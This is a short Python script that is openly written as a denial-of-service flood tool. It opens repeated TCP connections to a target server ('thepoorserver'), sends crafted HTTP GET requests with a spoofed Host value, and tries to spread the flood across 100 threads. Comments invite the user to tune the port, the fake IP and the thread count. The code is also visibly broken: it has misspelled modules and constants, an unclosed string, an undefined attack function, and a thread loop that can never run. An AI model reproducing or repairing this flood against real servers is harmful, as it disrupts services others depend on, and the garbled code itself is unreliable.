import threading
import socket


thepoorserver = '**'
port=80  #able to change
ur_ip = '***.***.*.*' #fake ip need to be 

succ_cnx = 0
while true:
    so=socket.socket(socket.AF8INET, socket.SOCK_STREAM)
    so.connect((thepoorserver,port))
    so.sendto(("GET /" + thepoorserver+"HTTP/1.1\r\n").encode('ascii'),(thepoorserver,port))
    so.sendto(("HOST :"+ur_ip+"\r\n\r\n").encode('ascii),(thepoorserver,port))
    so.close()
    
for i in range(100): #change 100 depends on how much threads u wanna send
    th=threadng.thread(thepoorserver=attack)
    th.start()